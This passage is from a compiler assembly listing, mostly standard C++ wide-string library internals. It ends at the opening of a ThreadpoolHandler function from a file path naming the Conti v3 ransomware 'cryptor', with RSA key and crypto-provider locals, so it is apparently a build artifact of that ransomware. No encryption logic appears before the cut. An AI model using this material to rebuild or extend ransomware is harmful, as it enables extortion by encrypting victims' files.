  00128	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity

; 4797 :             _Mypair._Myval2._Bx._Ptr = _New_ptr;

  0012d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00134	48 8b 4d 68	 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00138	48 89 08	 mov	 QWORD PTR [rax], rcx

; 4798 :         } else {

  0013b	eb 13		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4799 :             _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);

  0013d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00144	48 8d 55 68	 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00148	48 8b c8	 mov	 rcx, rax
  0014b	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
$LN4@Reallocate:

; 4800 :         }
; 4801 : 
; 4802 :         _ASAN_STRING_CREATE(*this);
; 4803 :         return *this;

  00150	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
$LN5@Reallocate:

; 4804 :     }

  00157	48 8b f8	 mov	 rdi, rax
  0015a	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  0015e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcFrameData
  00165	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0016a	48 8b c7	 mov	 rax, rdi
  0016d	48 8b 8d 38 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00174	48 33 cd	 xor	 rcx, rbp
  00177	e8 00 00 00 00	 call	 __security_check_cookie
  0017c	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  00183	5f		 pop	 rdi
  00184	5d		 pop	 rbp
  00185	c3		 ret	 0
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
_TEXT	SEGMENT
$T1 = 196
this$ = 256
_New_ptr$ = 264
_Count$ = 272
_Ptr$ = 280
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator(), COMDAT

; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);

  0002e	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00035	48 8b 95 18 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  0003c	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00043	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());

  00048	33 c0		 xor	 eax, eax
  0004a	66 89 85 c4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00051	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _New_ptr$[rbp]
  00058	48 8b 8d 10 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0005f	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00063	48 8d 95 c4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0006a	48 8b c8	 mov	 rcx, rax
  0006d	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3427 :             },

  00072	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00079	5f		 pop	 rdi
  0007a	5d		 pop	 rbp
  0007b	c3		 ret	 0
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
_My_data$ = 8
_Al$ = 40
_Alproxy$ = 72
_Proxy$ = 100
_New_capacity$ = 136
_New_ptr$ = 168
tv135 = 376
__$ArrayPad$ = 384
this$ = 432
_Arg$ = 440
_Count$ = 448
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>, COMDAT

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec b8 01
	00 00		 sub	 rsp, 440		; 000001b8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 36 00 00 00	 mov	 ecx, 54			; 00000036H
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 d8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+472]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 80 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00053	48 8b 85 b0 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0005a	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0005e	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00065	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  0006a	48 39 85 c0 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00071	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  00073	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00078	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00084	48 89 45 28	 mov	 QWORD PTR _Al$[rbp], rax

; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  00088	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  0008f	48 89 45 48	 mov	 QWORD PTR _Alproxy$[rbp], rax

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00093	4c 8b 45 08	 mov	 r8, QWORD PTR _My_data$[rbp]
  00097	48 8b 55 48	 mov	 rdx, QWORD PTR _Alproxy$[rbp]
  0009b	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  0009f	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  000a4	48 83 bd c0 01
	00 00 07	 cmp	 QWORD PTR _Count$[rbp], 7
  000ac	77 42		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  000ae	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000b2	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  000b9	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  000bd	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000c1	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);
; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);

  000c9	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000cd	41 b8 08 00 00
	00		 mov	 r8d, 8
  000d3	48 8b 95 b8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  000da	48 8b c8	 mov	 rcx, rax
  000dd	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  000e2	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  000e6	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  000eb	e9 ae 00 00 00	 jmp	 $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  000f0	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f7	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  000fc	4c 8b c0	 mov	 r8, rax
  000ff	ba 07 00 00 00	 mov	 edx, 7
  00104	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0010b	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00110	48 89 85 88 00
	00 00		 mov	 QWORD PTR _New_capacity$[rbp], rax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00117	48 8d 95 88 00
	00 00		 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  0011e	48 8b 4d 28	 mov	 rcx, QWORD PTR _Al$[rbp]
  00122	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  00127	48 89 85 a8 00
	00 00		 mov	 QWORD PTR _New_ptr$[rbp], rax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  0012e	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00132	48 8d 95 a8 00
	00 00		 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00139	48 8b c8	 mov	 rcx, rax
  0013c	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  00141	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00145	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0014c	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2704 :         _My_data._Myres  = _New_capacity;

  00150	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00154	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  0015b	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

  0015f	48 8b 85 c0 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00166	48 ff c0	 inc	 rax
  00169	48 89 85 78 01
	00 00		 mov	 QWORD PTR tv135[rbp], rax
  00170	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00177	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0017c	48 8b 8d 78 01
	00 00		 mov	 rcx, QWORD PTR tv135[rbp]
  00183	4c 8b c1	 mov	 r8, rcx
  00186	48 8b 95 b8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  0018d	48 8b c8	 mov	 rcx, rax
  00190	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  00195	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  00199	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2717 :     }

  0019e	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001a2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData
  001a9	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001ae	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  001b5	48 33 cd	 xor	 rcx, rbp
  001b8	e8 00 00 00 00	 call	 __security_check_cookie
  001bd	48 8d a5 98 01
	00 00		 lea	 rsp, QWORD PTR [rbp+408]
  001c4	5f		 pop	 rdi
  001c5	5d		 pop	 rbp
  001c6	c3		 ret	 0
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>, COMDAT

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00023	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002a	e8 00 00 00 00	 call	 ??0?$allocator@_W@std@@QEAA@XZ ; std::allocator<wchar_t>::allocator<wchar_t>
  0002f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00036	48 8b c8	 mov	 rcx, rax
  00039	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  0003e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00045	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
_Val1$ = 240
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >, COMDAT

; 1528 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00023	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00028	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002f	48 8b c8	 mov	 rcx, rax
  00032	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  00037	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00045	5f		 pop	 rdi
  00046	5d		 pop	 rbp
  00047	c3		 ret	 0
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z
_TEXT	SEGMENT
_Left$ = 224
_Right$ = 232
??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z PROC ; std::_Pocca<std::allocator<wchar_t> >, COMDAT

; 1067 : _CONSTEXPR20 void _Pocca(_Alloc& _Left, const _Alloc& _Right) noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1068 :     if constexpr (allocator_traits<_Alloc>::propagate_on_container_copy_assignment::value) {
; 1069 :         _Left = _Right;
; 1070 :     }
; 1071 : }

  00024	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002b	5f		 pop	 rdi
  0002c	5d		 pop	 rbp
  0002d	c3		 ret	 0
??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z ENDP ; std::_Pocca<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z
_TEXT	SEGMENT
_Val$ = 224
??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z PROC ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__7C4A1519_type_traits
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1584 :     return __builtin_addressof(_Val);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Val$[rbp]

; 1585 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z ENDP ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z
_TEXT	SEGMENT
RsaPublicKey$ = 8
CryptoProvider$ = 40
Buffer$ = 72
TaskInfo$5 = 104
$T6 = 328
$T7 = 392
__$ArrayPad$ = 408
ThreadPoolInfo$ = 448
?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z PROC	; ThreadpoolHandler, COMDAT

; 60   : {

$LN16:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec d8 01
